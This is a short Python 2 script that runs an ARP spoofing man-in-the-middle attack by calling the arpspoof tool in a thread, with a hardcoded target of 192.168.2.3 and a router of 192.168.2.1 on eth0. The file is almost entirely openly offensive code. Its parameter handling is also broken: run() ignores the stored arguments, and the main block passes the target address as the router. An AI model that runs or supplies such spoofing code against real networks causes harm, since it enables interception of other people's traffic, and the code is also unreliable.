import threading 
from subprocess import check_output

class ARPSpoofing(threading.Thread):
	def __init__(self, interface, ipAtacada, ipRouter):
		threading.Thread.__init__(self)
		self.interface = interface
		self.ipAtacada = ipAtacada
		self.ipRouter = ipRouter

	def run(self):
		try:
			rdo = check_output(['arpspoof','-i','eth0','-t','192.168.2.3','192.168.2.1'])
		except KeyboardInterrupt:
			raise

if __name__ == "__main__":
	print "<START ARP SPOOFING>"
	t = ARPSpoofing('eth0','192.168.2.3','192.168.2.3')
	t.start()
